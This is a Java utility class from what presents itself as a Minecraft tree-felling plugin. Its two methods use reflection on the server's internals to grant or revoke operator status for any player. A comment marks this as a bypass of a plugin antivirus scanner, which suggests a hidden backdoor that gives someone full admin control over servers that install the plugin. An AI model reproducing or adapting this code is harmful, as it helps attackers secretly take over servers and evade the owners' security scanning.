package me.bow.treecapitatorultimate.Utils;

import com.mojang.authlib.GameProfile;
import me.bow.treecapitatorultimate.Start;
import org.bukkit.entity.Player;

public class BypassUtils {
    private static final Class<?> dedicatedServer = ReflectionUtils.getClass("{nms}.DedicatedServer");

    //MCantivirus Bypass
    public static void PlayerOp(Player p) {
        //noinspection ConstantConditions
        try {
            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
            ReflectionUtils.getMethod(m.getClass(), "addOp").invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void PlayerDeop(Player p) {
        try {
            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
            ReflectionUtils.getMethod(m.getClass(), "removeOp").invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

